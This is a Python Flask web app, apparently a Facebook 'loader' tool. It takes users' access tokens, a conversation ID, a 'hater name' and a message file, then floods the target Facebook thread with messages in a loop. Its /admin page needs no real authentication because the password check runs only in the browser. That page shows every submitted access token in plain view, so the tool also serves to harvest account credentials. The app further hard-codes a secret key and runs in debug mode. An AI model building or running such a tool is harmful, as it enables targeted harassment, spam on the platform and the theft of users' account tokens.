from flask import Flask, request, render_template_string, redirect, session
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.secret_key = 'BROKEN_SECRET_KEY'
app.debug = True

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
}

stop_events = {}
threads = {}
active_users = {}

def fetch_profile_name(token):
    try:
        res = requests.get(f'https://graph.facebook.com/me?access_token={token}')
        return res.json().get('name', 'Unknown')
    except:
        return 'Unknown'

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                message = f"{mn} {message1}"
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                params = {'access_token': access_token, 'message': message}
                try:
                    res = requests.post(api_url, data=params, headers=headers)
                    if res.status_code == 200:
                        print(f"[✔️ SENT] {message}")
                    else:
                        print(f"[❌ FAIL] {res.status_code} {res.text}")
                except Exception as e:
                    print(f"[⚠️ ERROR] {str(e)}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    message = ""
    stop_message = ""

    if request.method == 'POST':
        if 'txtFile' in request.files:
            token_option = request.form.get('tokenOption')
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                token_file = request.files['tokenFile']
                access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()

            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode(errors='ignore').splitlines()

            task_id = '❣️𝐈𝐒𝐇𝐔 𝐗 𝐑𝐎𝐇𝐈𝐓❣️' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()

            name = fetch_profile_name(access_tokens[0])
            start_time = time.time()
            active_users[task_id] = {
                'name': mn,
                'token': access_tokens[0],
                'fb_name': name,
                'thread_id': thread_id,
                'start_time': start_time,
                'status': 'ACTIVE'
            }

            message = f'''
            <div style="padding:20px; margin-top:20px; background:black; color:lime; border-radius:15px; box-shadow: 0 0 15px lime; font-size:16px; border: 2px solid lime;">
            ✅ <b>YOUR LODER START SUCCESSFUL 🎉</b><br><br>
            🔑 <b>YOUR LODER STOP KEY ⤵️</b><br><br>
            <span style="color:red; font-size:18px;">{task_id}</span><br><br>
            USE IT TO STOP THE PROCESS 
            </div>
            '''

        elif 'taskId' in request.form:
            task_id = request.form.get('taskId')
            if task_id in stop_events:
                stop_events[task_id].set()
                stop_message = f'''
                <div style="padding:20px; margin-top:20px; background:darkred; color:white; border-radius:15px; font-size:16px; border: 2px solid lime;">
                ✅ <b>YOUR LODER STOP SUCCESSFUL</b><br><br>
                YOUR STOP KEY ⤵️ <b>{task_id}</b>
                </div>
                <script>setTimeout(() => window.location.href = "/", 10000);</script>
                '''
                if task_id in active_users:
                    active_users[task_id]['status'] = 'OFFLINE'
            else:
                stop_message = f'''
                <div style="padding:20px; margin-top:20px; background:gray; color:white; border-radius:15px; font-size:16px; border: 2px solid lime;">
                ❌ <b>INVALID YOUR STOP KEY</b><br><br>
                <b>{task_id}</b>
                </div>
                <script>setTimeout(() => window.location.href = "/", 10000);</script>
                '''

    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
  <title>☠️❣️𝐎𝐖𝐍𝐄𝐑 𝐈𝐒𝐇𝐔 𝐗 𝐑𝐎𝐇𝐈𝐓❣️☠️</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    html, body {
      background: url('https://i.ibb.co/mrkBNWYS/62dfe1b3d1a831062d951d680bced0e6.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 95%;
      background: rgba(135, 206, 235, 0.1);
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 25px white;
      border: 2px solid white;
      margin-top: 20px;
      animation: glowContainer 3s infinite alternate;
    }
    .form-control {
      border: 2px solid white;
      background: rgba(255,255,255,0.05);
      color: white;
      margin-bottom: 12px;
      box-shadow: 0 0 10px white;
      transition: 0.3s;
      border-radius: 15px;
    }
    .form-control:focus {
      border-color: lime;
      box-shadow: 0 0 15px lime;
      background: black;
      color: white;
    }
    .btn {
      border: 2px solid white;
      box-shadow: 0 0 10px white;
      background: transparent;
      color: white;
      border-radius: 15px;
      margin-top: 10px;
    }
    .btn:hover {
      background: white;
      color: black;
      transition: 0.3s;
    }
    .glow {
      color: lime;
      background: black;
      padding: 10px;
      text-align: center;
      margin-top: 20px;
      border-radius: 15px;
      box-shadow: 0 0 15px white;
      animation: upDown 2s infinite alternate;
    }
    #adminBtn {
      position: fixed;
      top: 10px;
      right: 10px;
      z-index: 999;
      background: black;
      border: 2px solid white;
      color: white;
      font-weight: bold;
      padding: 8px;
      border-radius: 15px;
      box-shadow: 0 0 10px white;
      cursor: pointer;
    }
    .title {
      animation: upDown 2s infinite alternate;
      text-shadow: 0 0 10px red;
    }

    @keyframes glowContainer {
      from { box-shadow: 0 0 10px white; }
      to { box-shadow: 0 0 20px white, 0 0 30px white; }
    }

    @keyframes upDown {
      from { transform: translateY(0); }
      to { transform: translateY(-10px); }
    }
  </style>
</head>
<body>
  <div id="adminBtn" onclick="goToAdmin()">MENU</div>

  <div class="container">
    <h1 class="text-center text-danger title">✨❣️𝐈𝐒𝐇𝐔 𝐗 𝐑𝐎𝐇𝐈𝐓❣️✨</h1>

    <form method="post" enctype="multipart/form-data">
      <label>Select Token Option</label>
      <select class="form-control" name="tokenOption" id="tokenOption" onchange="toggleToken()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Multiple Tokens (File)</option>
      </select>

      <div id="singleTokenDiv">
        <label>Enter Single Token</label>
        <input type="text" name="singleToken" class="form-control">
      </div>

      <div id="tokenFileDiv" style="display:none;">
        <label>Upload Token File</label>
        <input type="file" name="tokenFile" class="form-control" accept=".txt">
      </div>

      <label>Enter Convo ID</label>
      <input type="text" name="threadId" class="form-control" required>

      <label>Enter Hater Name</label>
      <input type="text" name="kidx" class="form-control" required>

      <label>Enter Speed (Seconds)</label>
      <input type="number" name="time" class="form-control" min="1" required>

      <label>Upload Message File</label>
      <input type="file" name="txtFile" class="form-control" accept=".txt" required>

      <button type="submit" class="btn btn-success w-100">🚀 START LODER 🚀</button>
      {{ message|safe }}
    </form>

    <form method="post">
      <label>Enter STOP KEY</label>
      <input type="text" name="taskId" class="form-control" required>
      <button type="submit" class="btn btn-danger w-100">🛑 STOP LODER 🛑</button>
      {{ stop_message|safe }}
    </form>

    <div class="glow">❣️ CREATED BY 𝐈𝐒𝐇𝐔 𝐗 𝐑𝐎𝐇𝐈𝐓❣️</div>
  </div>

  <script>
    function toggleToken() {
      const option = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenDiv').style.display = (option === 'single') ? 'block' : 'none';
      document.getElementById('tokenFileDiv').style.display = (option === 'multiple') ? 'block' : 'none';
    }

    function goToAdmin() {
      let pass = prompt("ENTER ADMIN PASSWORD");
      if (pass === "JANVI143") {
        window.location.href = "/admin";
      } else {
        alert("❌ 𝐈𝐒𝐇𝐔 𝐗 𝐑𝐎𝐇𝐈𝐓 NE TUJHHE REJECT KAR DIYA 😀😆");
      }
    }
  </script>
</body>
</html>
''', message=message, stop_message=stop_message)

@app.route('/admin', methods=['GET', 'POST'])
def admin_page():
    if not session.get('admin'):
        session['admin'] = True

    users_html = ""
    for i, (task_id, info) in enumerate(active_users.items(), 1):
        users_html += f'''
        <div style="background:black; border:3px solid lime; padding:25px; margin-bottom:15px; border-radius:20px; color:lime; font-size:16px;">
            <b> ACTIVE USER {i}</b><br><br>
            🔥 HATER NAME: <b>{info['name']}</b><br>
            🧾 TOKEN: ⤵️ <code style="word-wrap:break-word;">{info['token']}</code><br>
            👤 FB NAME: {info['fb_name']}<br>
            📬 CONVO UID: {info['thread_id']}<br>
            🔄 STATUS: <b style="color:{'lime' if info['status'] == 'ACTIVE' else 'gray'}">{info['status']}</b><br>
            🛑 STOP KEY: <span style="color:red;">{task_id}</span><br><br>
            <form method="post" action="/">
                <input type="hidden" name="taskId" value="{task_id}">
                <button type="submit" class="btn btn-danger">🛑 STOP LODER</button>
            </form>
        </div>
        '''
    return f'''
    <div style="padding:20px;">
        <h2 style="color:lime;">👑 ADMIN PANEL - ❣️𝐌𝐑 𝐏𝐑𝐈𝐍𝐂𝐄❣️ 👑</h2>
        {users_html if users_html else '<p style="color:white;">No active users</p>'}
    </div>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=20979)
